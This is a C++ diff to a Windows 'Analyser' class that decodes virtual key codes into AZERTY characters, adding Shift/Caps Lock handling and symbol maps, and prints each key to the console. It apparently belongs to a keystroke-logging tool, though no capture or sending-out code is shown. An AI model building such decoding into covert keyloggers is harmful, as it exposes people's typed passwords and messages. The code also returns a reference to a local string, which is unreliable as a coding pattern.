@@ -3,18 +3,41 @@
 
 Analyser::Analyser()
 {
-initMap();
+	initMap();
 }
 
 Analyser::~Analyser()
 {
 }
 
+int	 Analyser::isCapsLock() const
+{
+	return (GetKeyState(VK_CAPITAL) & 0x0001);
+}
+
 std::string&				Analyser::analysis(AEvent* event)
 {
-	if (_translateMap.find(event->getVirtualKeyCode()) != _translateMap.end)
-		std::cout << _translateMap[event->getVirtualKeyCode()].c_str() << std::endl;
-		std::string s("");
+	std::string s("");
+	if (GetAsyncKeyState(VK_SHIFT) ^ isCapsLock() && _translateShiftMap.find(event->getVirtualKeyCode()) != _translateShiftMap.end())
+	{
+		std::cout << _translateShiftMap[event->getVirtualKeyCode()].c_str() << std::endl;
+	}
+	else
+	{
+		if (_translateMap.find(event->getVirtualKeyCode()) != _translateMap.end())
+			std::cout << _translateMap[event->getVirtualKeyCode()].c_str() << std::endl;
+		else if ((event->getVirtualKeyCode() > 64) && (event->getVirtualKeyCode() < 91)) // Keys a-z
+		{
+			char c = MapVirtualKey(event->getVirtualKeyCode(), MAPVK_VK_TO_CHAR); // Un-capitalize letters
+			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
+			{
+				c += 32;
+			}
+			s.append(&c, 1);
+			s.append("\0");
+			std::cout << s.c_str() << std::endl;
+		}
+	}
 	return s;
 }
 
@@ -63,6 +86,7 @@ void						Analyser::initMap()
 	_translateMap[VK_RIGHT] = "[RArrow]";
 	_translateMap[VK_UP] = "[UpArrow]";
 	_translateMap[VK_DOWN] = "[DownArrow]";
+	_translateMap[VK_SLEEP] = "[Sleep]";
 	_translateMap[VK_NUMPAD0] = "[0]";
 	_translateMap[VK_NUMPAD1] = "[1]";
 	_translateMap[VK_NUMPAD2] = "[2]";
@@ -97,5 +121,47 @@ void						Analyser::initMap()
 	_translateMap[VK_F22] = "[F22]";
 	_translateMap[VK_F23] = "[F23]";
 	_translateMap[VK_F24] = "[F24]";
-	_translateMap[VK_OEM_2] = ",";
+	_translateMap[VK_OEM_1] = "$";
+	_translateMap[VK_OEM_PLUS] = "=";
+	_translateMap[VK_OEM_COMMA] = ",";
+	_translateMap[VK_OEM_MINUS] = "-";
+	_translateMap[VK_OEM_PERIOD] = ";";
+	_translateMap[VK_OEM_2] = ":";
+	_translateMap[VK_OEM_3] = "ù";
+	_translateMap[VK_OEM_4] = ")";
+	_translateMap[VK_OEM_5] = "*";
+	_translateMap[VK_OEM_6] = "^";
+	_translateMap[VK_OEM_7] = "²";
+	_translateMap[VK_OEM_8] = "!";
+	_translateMap[0x30] = "@";
+	_translateMap[0x31] = "&";
+	_translateMap[0x32] = "~";
+	_translateMap[0x33] = "\"";
+	_translateMap[0x34] = "\'";
+	_translateMap[0x35] = "(";
+	_translateMap[0x36] = "-";
+	_translateMap[0x37] = "`";
+	_translateMap[0x38] = "_";
+	_translateMap[0x39] = "^";
+	_translateShiftMap[VK_OEM_1] = "£";
+	_translateShiftMap[VK_OEM_PLUS] = "+";
+	_translateShiftMap[VK_OEM_COMMA] = "?";
+	_translateShiftMap[VK_OEM_PERIOD] = ".";
+	_translateShiftMap[VK_OEM_2] = "/";
+	_translateShiftMap[VK_OEM_3] = "%";
+	_translateShiftMap[VK_OEM_4] = "°";
+	_translateShiftMap[VK_OEM_5] = "µ";
+	_translateShiftMap[VK_OEM_6] = "¨";
+	_translateShiftMap[VK_OEM_8] = "§";
+	_translateShiftMap[0x30] = "0";
+	_translateShiftMap[0x31] = "1";
+	_translateShiftMap[0x32] = "2";
+	_translateShiftMap[0x33] = "3";
+	_translateShiftMap[0x34] = "4";
+	_translateShiftMap[0x35] = "5";
+	_translateShiftMap[0x36] = "6";
+	_translateShiftMap[0x37] = "7";
+	_translateShiftMap[0x38] = "8";
+	_translateShiftMap[0x39] = "9";
+
 }
